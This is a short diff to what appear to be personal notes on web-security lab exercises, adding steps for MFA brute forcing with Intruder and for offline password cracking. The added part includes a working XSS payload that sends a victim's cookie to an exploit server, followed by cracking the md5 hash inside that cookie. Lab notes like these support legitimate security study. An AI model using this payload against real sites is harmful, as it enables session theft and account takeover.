@@ -12,6 +12,13 @@
   Change the verify cookie to carlos to generate a code for carlos
   Brute force using the Intruder the mfa-code for carlos using the POST /login2 request with verify cookie value set to carlos
   Open the 302 response in the browser
+- ==Offline password cracking==
+  Test the stay-logged-in function with the provided credentials and find that it is a base64 string consisting of the username and password hashed md5. 
+  XSS in the comment section
+  `<script>document.location='https://exploit-exploit_id.exploit-server.net/'+document.cookie</script>`
+  View the cookie of carlos and crack it to log in
+
+
 
 ## Insecure Deserialisation Vulnerabilities
 - ==Modifying serialized data types==
